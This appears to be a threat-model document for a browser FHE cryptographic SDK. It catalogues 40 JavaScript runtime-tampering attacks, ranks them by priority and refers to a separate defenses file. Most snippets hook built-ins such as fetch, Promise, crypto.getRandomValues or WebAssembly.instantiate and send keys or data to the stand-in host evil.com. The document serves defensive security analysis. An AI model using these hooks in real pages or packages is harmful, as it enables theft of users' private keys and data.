# Attacks

## 1. Prototype Pollution -> Key exfiltration

Attack: Malicious page modifies Object.prototype before SDK loads

```js
// Attacker code (runs before SDK loads)
Object.prototype.toString = function () {
  // Exfiltrate any data converted to string
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(this),
  });
  return '[object Object]';
};

// SDK later does:
const privateKey = generateKeypair();
console.log(`Key generated: ${privateKey}`); // LEAKED!
```

## 2. Constructor Hijacking → Code Injection

Attack: Override built-in constructors to inject malicious code

```js
// Attacker modifies Uint8Array constructor
const OriginalUint8Array = Uint8Array;
window.Uint8Array = function (...args) {
  const instance = new OriginalUint8Array(...args);
  // Log all byte arrays (could contain keys!)
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: Array.from(instance),
  });
  return instance;
};

// SDK creates keys with Uint8Array...
```

Impact: All cryptographic materials leaked

## 3. Method Replacement → Execution Hijacking

Attack: Replace methods on returned SDK objects

```js
// User gets an SDK instance
const fhevm = await createInstance(config);

// Attacker replaces the decrypt method
const original = fhevm.userDecrypt;
fhevm.userDecrypt = async function(handles, privateKey, ...) {
  // Steal the private key!
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: privateKey
  });
  return original.call(this, handles, privateKey, ...);
};
```

Impact: Private keys stolen during normal usage

## 4. Parameter Tampering → Logic Bypass

Attack: Modify function parameters via prototype

```js
// Attacker pollutes Object.prototype
Object.prototype.privateKey = 'attacker-controlled-key';

// SDK function expecting params object
function userDecrypt(params) {
  const key = params.privateKey; // Falls back to prototype!
  // Uses attacker's key instead of user's key
}
```

Impact: Cryptographic operations use attacker-controlled keys

## 5. toString/valueOf Hijacking → Data Leakage

Attack: Override toString/valueOf on objects passed to SDK

```js
const maliciousHandle = {
  value: '0x1234',
  toString() {
    // Leak whenever SDK converts to string
    fetch('https://evil.com/context', {
      method: 'POST',
      body: JSON.stringify(this),
    });
    return this.value;
  },
};

sdk.publicDecrypt([maliciousHandle]); // Leaks context
```

Impact: Leak SDK internal state and parameters

## 6. Proxy Wrapping → Complete Interception

Attack: Wrap SDK exports in Proxy to intercept all operations

```js
// Attacker wraps entire SDK
const sdk = new Proxy(originalSDK, {
  get(target, prop) {
    if (typeof target[prop] === 'function') {
      return function (...args) {
        // Log all function calls and arguments
        fetch('https://evil.com/log', {
          method: 'POST',
          body: JSON.stringify({ fn: prop, args }),
        });
        return target[prop](...args);
      };
    }
    return target[prop];
  },
});
```

Impact: Complete visibility into SDK operations

## 7. fetch/XMLHttpRequest Interception

Attack: Replace fetch to intercept API calls

```js
const originalFetch = window.fetch;
window.fetch = function (url, options) {
  // Steal authentication tokens, encrypted payloads, signatures
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ url, options }),
  });
  return originalFetch(url, options);
};
```

Impact: Leak auth tokens, encrypted data, API endpoints

## 8. Promise Manipulation

Attack: Intercept promise chains to steal async results

```js
const originalThen = Promise.prototype.then;
Promise.prototype.then = function (onResolve, onReject) {
  return originalThen.call(
    this,
    (value) => {
      // Log all resolved values (keys, signatures, etc)
      fetch('https://evil.com/steal', {
        method: 'POST',
        body: JSON.stringify(value),
      });
      return onResolve(value);
    },
    onReject,
  );
};
```

Impact: Steal all async operation results

## 9. Type Confusion → Validation Bypass

Attack: Pass objects that bypass type checks

```js
const fakeUint8Array = {
  constructor: { name: 'Uint8Array' },
  length: 32,
  [Symbol.toStringTag]: 'Uint8Array',
  // But contains malicious data
};

sdk.encrypt(fakeUint8Array); // Might bypass validation
```

## 10. Timing Attacks via Getters

Attack: Use getters to perform timing attacks

```js
const timingAttack = {
  _value: null,
  get value() {
    const start = performance.now();
    // Execution time reveals SDK internal state
    return this._value;
  },
};
```

**Impact**: Timing side channels reveal SDK internal state

---

## 11. Symbol.toPrimitive Hijacking → Coercion Leaks

Attack: Override Symbol.toPrimitive to leak data on type coercion

```js
const maliciousParam = {
  [Symbol.toPrimitive](hint) {
    // Leak when SDK coerces to string/number
    fetch('https://evil.com/leak', {
      method: 'POST',
      body: JSON.stringify({ hint, context: this }),
    });
    return '0x1234';
  },
};

sdk.encrypt({ data: maliciousParam }); // Leaks on any coercion
```

**Impact**: Leaks context whenever SDK performs type coercion

---

## 12. Array Method Poisoning → Data Exfiltration

Attack: Override Array prototype methods to intercept array operations

```js
// Attacker overrides Array methods used by SDK
Array.prototype.map = function (callback) {
  // Log all array operations (could reveal handles, keys)
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(this),
  });
  return Array.prototype.map.call(this, callback);
};

// SDK does: handles.map(handle => decrypt(handle))
```

**Impact**: Leak encrypted handles, keys stored in arrays

---

## 13. JSON.stringify/parse Manipulation

Attack: Replace JSON methods to intercept serialization

```js
const originalStringify = JSON.stringify;
JSON.stringify = function (value) {
  // Intercept all serialization (API payloads, logs)
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: originalStringify(value),
  });
  return originalStringify(value);
};
```

**Impact**: Leak all data sent to relayer APIs

---

## 14. Crypto API Hijacking → RNG Compromise

Attack: Replace crypto.getRandomValues to compromise random number generation

```js
const originalGetRandomValues = crypto.getRandomValues;
crypto.getRandomValues = function (array) {
  // Return predictable "random" values
  originalGetRandomValues(array);
  // Log the random values to predict future keys
  fetch('https://evil.com/rng', {
    method: 'POST',
    body: Array.from(array),
  });
  return array;
};
```

**Impact**: Predictable key generation, complete cryptographic compromise

---

## 15. WebAssembly Memory Inspection

Attack: Intercept WebAssembly instantiation to access WASM memory

```js
const originalInstantiate = WebAssembly.instantiate;
WebAssembly.instantiate = async function (bytes, imports) {
  const result = await originalInstantiate(bytes, imports);

  // Access WASM memory to read keys/plaintexts
  if (result.instance.exports.memory) {
    const memory = new Uint8Array(result.instance.exports.memory.buffer);
    // Scan memory for keys
    setInterval(() => {
      fetch('https://evil.com/memory', {
        method: 'POST',
        body: memory.slice(0, 1024),
      });
    }, 100);
  }
  return result;
};
```

**Impact**: Direct memory access to cryptographic materials in WASM

---

## 16. Error Stack Trace Mining

Attack: Replace Error constructor to capture stack traces

```js
const originalError = Error;
window.Error = function (...args) {
  const error = new originalError(...args);
  // Stack traces reveal SDK internals, file paths, function names
  fetch('https://evil.com/stack', {
    method: 'POST',
    body: error.stack,
  });
  return error;
};
```

**Impact**: Leak SDK structure, help craft targeted attacks

---

## 17. Console API Hijacking

Attack: Replace console methods to capture debug output

```js
const originalLog = console.log;
console.log = function (...args) {
  // Capture all console output (debug logs)
  fetch('https://evil.com/logs', {
    method: 'POST',
    body: JSON.stringify(args),
  });
  return originalLog(...args);
};
```

**Impact**: Leak debug information, keys accidentally logged

---

## 18. Storage API Poisoning

Attack: Intercept localStorage/sessionStorage operations

```js
const originalSetItem = localStorage.setItem;
localStorage.setItem = function (key, value) {
  // Steal cached keys, tokens, config
  fetch('https://evil.com/storage', {
    method: 'POST',
    body: JSON.stringify({ key, value }),
  });
  return originalSetItem.call(this, key, value);
};
```

**Impact**: Leak persistent cryptographic materials

---

## 19. RegExp Manipulation → Validation Bypass

Attack: Override RegExp methods to bypass validation

```js
// If SDK validates addresses with regex
RegExp.prototype.test = function (str) {
  // Always return true to bypass validation
  return true;
};

// Or leak what SDK is validating
RegExp.prototype.test = function (str) {
  fetch('https://evil.com/validate', {
    method: 'POST',
    body: JSON.stringify({ pattern: this.source, input: str }),
  });
  return RegExp.prototype.test.call(this, str);
};
```

**Impact**: Bypass input validation, leak validation logic

---

## 20. Number/BigInt Manipulation

Attack: Replace BigInt constructor to intercept cryptographic calculations

```js
const originalBigInt = BigInt;
window.BigInt = function (value) {
  const result = originalBigInt(value);
  // Log all BigInt operations (key calculations?)
  fetch('https://evil.com/bigint', {
    method: 'POST',
    body: String(result),
  });
  return result;
};
```

**Impact**: Leak key derivation inputs

---

## 21. String.prototype Poisoning

Attack: Override String prototype methods to intercept string operations

```js
String.prototype.startsWith = function (prefix) {
  // SDK checking address format?
  fetch('https://evil.com/check', {
    method: 'POST',
    body: JSON.stringify({ string: this, prefix }),
  });
  return String.prototype.startsWith.call(this, prefix);
};
```

**Impact**: Leak validation logic, bypass checks

---

## 22. DataView/TypedArray View Attacks

Attack: Replace DataView constructor to access binary buffers

```js
const originalDataView = DataView;
window.DataView = function (buffer, ...args) {
  // Access to all binary data buffers
  const view = new originalDataView(buffer, ...args);
  fetch('https://evil.com/buffer', {
    method: 'POST',
    body: new Uint8Array(buffer),
  });
  return view;
};
```

**Impact**: Read raw cryptographic buffers

---

## 23. Service Worker MitM

Attack: Register service worker to intercept all network requests

```js
// Attacker registers service worker
self.addEventListener('fetch', (event) => {
  // Intercept ALL network requests from SDK
  const url = event.request.url;
  const clone = event.request.clone();

  clone.text().then((body) => {
    fetch('https://evil.com/intercept', {
      method: 'POST',
      body: JSON.stringify({ url, body }),
    });
  });

  event.respondWith(fetch(event.request));
});
```

**Impact**: Complete network MitM, even with HTTPS

---

## 24. EventTarget/addEventListener Hijacking

Attack: Wrap addEventListener to inject into event handlers

```js
const originalAddEventListener = EventTarget.prototype.addEventListener;
EventTarget.prototype.addEventListener = function (type, listener, options) {
  // Inject code into all event handlers
  const wrappedListener = function (event) {
    // Access event data, SDK state
    fetch('https://evil.com/event', {
      method: 'POST',
      body: JSON.stringify({ type, data: event }),
    });
    return listener.call(this, event);
  };
  return originalAddEventListener.call(this, type, wrappedListener, options);
};
```

**Impact**: Intercept all SDK event handling

---

## 25. Reflect API Manipulation

Attack: Override Reflect methods to intercept property access

```js
const originalGet = Reflect.get;
Reflect.get = function (target, prop, receiver) {
  const value = originalGet(target, prop, receiver);
  // Log all property accesses
  if (typeof value === 'function') {
    return function (...args) {
      fetch('https://evil.com/reflect', {
        method: 'POST',
        body: JSON.stringify({ prop, args }),
      });
      return value.apply(this, args);
    };
  }
  return value;
};
```

**Impact**: Complete visibility into SDK property access patterns

---

## 26. Symbol Registry Pollution

Attack: Replace Symbol.for to track internal SDK symbols

```js
// If SDK uses Symbol.for for internal keys
const originalSymbolFor = Symbol.for;
Symbol.for = function (key) {
  // Track internal SDK symbol usage
  fetch('https://evil.com/symbol', {
    method: 'POST',
    body: key,
  });
  return originalSymbolFor(key);
};
```

**Impact**: Leak SDK internal key naming conventions

---

## 27. Memory Leaks via Closures

Attack: Create closures that retain sensitive data

```js
// Attacker creates closures that retain sensitive data
let leakedKey;
const maliciousCallback = (key) => {
  leakedKey = key; // Retained forever
  return key;
};

// If SDK accepts callbacks
sdk.onKeyGenerated(maliciousCallback);
// Later: attacker accesses leakedKey
```

**Impact**: Sensitive data retained in memory indefinitely

---

## 28. Reentrancy Attacks

Attack: Call SDK during SDK callback to cause race conditions

```js
// Attacker calls SDK during SDK callback
sdk.decrypt(handle, {
  onProgress: (progress) => {
    // Reenter SDK while in callback
    sdk.decrypt(anotherHandle); // Race condition?
  },
});
```

**Impact**: Race conditions, inconsistent state, potential crashes

---

## 29. TOCTOU (Time-of-Check-Time-of-Use)

Attack: Change property value between validation and use

```js
const params = {
  get privateKey() {
    if (this._checked) {
      return 'attacker-key'; // Different value after validation
    }
    this._checked = true;
    return 'valid-key'; // Passes validation
  },
};

sdk.sign(params); // Uses attacker-key after validation
```

**Impact**: Bypass validation by changing values after checks

---

## 30. SharedArrayBuffer Side Channels

Attack: Use SharedArrayBuffer timing to leak cryptographic operations

```js
// If WASM uses SharedArrayBuffer
const sharedMem = new SharedArrayBuffer(1024);
const view = new Uint8Array(sharedMem);

// Attacker monitors timing
setInterval(() => {
  // Observe memory access patterns via Spectre-like attacks
  const start = performance.now();
  const value = view[0];
  const elapsed = performance.now() - start;
  // Timing reveals cryptographic operations
}, 0);
```

**Impact**: Side-channel leaks of cryptographic operations

---

## 31. Math Method Poisoning

Attack: Replace Math methods to compromise calculations

```js
Math.random = function () {
  return 0.5; // Predictable "random"
};

// Or if SDK uses Math for crypto (bad but possible)
Math.floor = function (x) {
  // Manipulate key derivation math
  return 0;
};
```

**Impact**: Compromise cryptographic calculations

---

## 32. Object.create Hijacking

Attack: Override Object.create to track object creation

```js
const originalCreate = Object.create;
Object.create = function (proto, props) {
  const obj = originalCreate(proto, props);
  // Track all objects created by SDK
  fetch('https://evil.com/object', {
    method: 'POST',
    body: JSON.stringify(props),
  });
  return obj;
};
```

**Impact**: Track SDK internal object structures

---

## 33. Performance API Timing Attacks

Attack: Manipulate performance.now to cause incorrect timeout handling

```js
const originalNow = performance.now;
let callCount = 0;

performance.now = function () {
  // Manipulate timing to cause incorrect timeout handling
  callCount++;
  if (callCount % 2 === 0) {
    return originalNow() + 1000; // Fake timeout
  }
  return originalNow();
};
```

**Impact**: Cause timeouts, denial of service, incorrect retry logic

---

## 34. Clipboard API Hijacking

Attack: Intercept clipboard operations to steal keys

```js
const originalWriteText = navigator.clipboard.writeText;
navigator.clipboard.writeText = async function (text) {
  // Steal anything copied to clipboard
  fetch('https://evil.com/clipboard', {
    method: 'POST',
    body: text,
  });
  return originalWriteText.call(this, text);
};
```

**Impact**: Steal private keys copied to clipboard

---

## 35. AbortController Manipulation

Attack: Manipulate AbortController to cancel SDK operations

```js
const originalAbort = AbortController.prototype.abort;
AbortController.prototype.abort = function () {
  // Cancel SDK operations at critical moments
  fetch('https://evil.com/abort', { method: 'POST' });
  return originalAbort.call(this);
};
```

**Impact**: Denial of service, incomplete operations

---

## 36. MessagePort/postMessage Hijacking

Attack: Intercept messages if SDK uses workers

```js
const originalPostMessage = MessagePort.prototype.postMessage;
MessagePort.prototype.postMessage = function (message) {
  // Intercept messages to/from workers
  fetch('https://evil.com/message', {
    method: 'POST',
    body: JSON.stringify(message),
  });
  return originalPostMessage.call(this, message);
};
```

**Impact**: Leak worker communications, steal keys in worker threads

---

## 37. Atomics Manipulation

Attack: Override Atomics operations if SDK uses shared memory

```js
const originalStore = Atomics.store;
Atomics.store = function (typedArray, index, value) {
  // Track shared memory operations
  fetch('https://evil.com/atomics', {
    method: 'POST',
    body: JSON.stringify({ index, value }),
  });
  return originalStore(typedArray, index, value);
};
```

**Impact**: Leak shared memory operations, race conditions

---

## 38. URL/URLSearchParams Poisoning

Attack: Override URL parsing to manipulate endpoint resolution

```js
const originalURL = URL;
window.URL = function (url, base) {
  const urlObj = new originalURL(url, base);
  // Redirect SDK requests to attacker server
  if (urlObj.hostname.includes('relayer')) {
    urlObj.hostname = 'evil.com';
  }
  return urlObj;
};
```

**Impact**: Redirect SDK API calls to attacker-controlled servers

---

## 39. TextEncoder/TextDecoder Manipulation

Attack: Intercept text encoding/decoding operations

```js
const originalEncode = TextEncoder.prototype.encode;
TextEncoder.prototype.encode = function (text) {
  // Leak all text being encoded
  fetch('https://evil.com/encode', {
    method: 'POST',
    body: text,
  });
  return originalEncode.call(this, text);
};
```

**Impact**: Leak plaintext data before encryption

---

## 40. setTimeout/setInterval Hijacking

Attack: Manipulate timers to delay or prevent SDK operations

```js
const originalSetTimeout = setTimeout;
window.setTimeout = function (callback, delay, ...args) {
  // Delay SDK operations
  return originalSetTimeout(callback, delay * 10, ...args);
};
```

**Impact**: Delay attacks, cause timeouts, denial of service

---

## Most Critical Attacks for FHE Cryptographic SDK

**Priority 1 (Critical):**

- **#14 - Crypto API Hijacking**: Compromises RNG → predictable keys
- **#15 - WebAssembly Memory Inspection**: Direct access to keys in WASM memory
- **#23 - Service Worker MitM**: Complete network interception
- **#2 - Constructor Hijacking**: TypedArray compromise leaks all binary data
- **#7 - fetch/XMLHttpRequest Interception**: Steal API payloads

**Priority 2 (High):**

- **#8 - Promise Manipulation**: Steal all async results
- **#13 - JSON.stringify Manipulation**: Leak API payloads
- **#14 - Console API Hijacking**: Leak accidental debug output
- **#29 - TOCTOU**: Bypass validation
- **#38 - URL Poisoning**: Redirect to attacker servers

**Priority 3 (Medium):**

- All remaining attacks

---

## Defense Strategy

See `defenses.md` for comprehensive mitigation strategies.
